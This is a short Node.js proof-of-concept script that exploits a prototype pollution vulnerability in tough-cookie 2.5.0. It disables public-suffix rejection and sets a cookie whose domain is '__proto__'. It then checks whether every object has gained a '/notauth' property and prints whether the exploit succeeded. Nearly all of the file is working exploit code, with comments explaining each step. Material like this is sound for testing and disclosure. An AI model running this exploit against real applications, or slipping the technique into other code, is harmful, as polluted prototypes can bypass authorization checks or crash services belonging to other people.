const tough = require('tough-cookie');

console.log("Attempting to exploit the vulnerability...");

// Exploit the vulnerability in tough-cookie 2.5.0
try {
    const jar = new tough.CookieJar(undefined, {
        rejectPublicSuffixes: false
    });

    // This line tries to pollute the prototype of the object by setting a cookie
    // with the domain "__proto__". "__proto__" is a special property in JavaScript 
    // that allows manipulation of the object's prototype, which can lead to
    // unintended consequences. By setting a cookie with Domain=__proto__, we
    // are attempting to inject malicious properties into the global object prototype.
    jar.setCookieSync("Slonser=polluted; Domain=__proto__; Path=/notauth", "https://__proto__/admin");
    
    // This is a legitimate cookie, to show that only the polluted cookie should be affected
    jar.setCookieSync("Auth=Lol; Domain=google.com; Path=/notauth", "https://google.com/");

    // Now, we check if the prototype was polluted by checking the global object
    // for any new property that shouldn't be there, specifically "/notauth".
    const pollutedObject = {};

    // If the vulnerability is successfully exploited, the prototype of pollutedObject
    // might have been modified, allowing for arbitrary properties to be set on all objects
    // in the system.
    if (pollutedObject["/notauth"] !== undefined) {
        // If the exploit was successful, this will print:
        console.log("EXPLOITED SUCCESSFULLY");
    } else {
        // If the exploit failed (e.g., the prototype wasn't polluted), this will print:
        console.log("EXPLOIT FAILED");
    }
} catch (err) {
    // If an error occurs while attempting to exploit the vulnerability, we catch and display it.
    console.error("Error exploiting vulnerability: ", err);
}
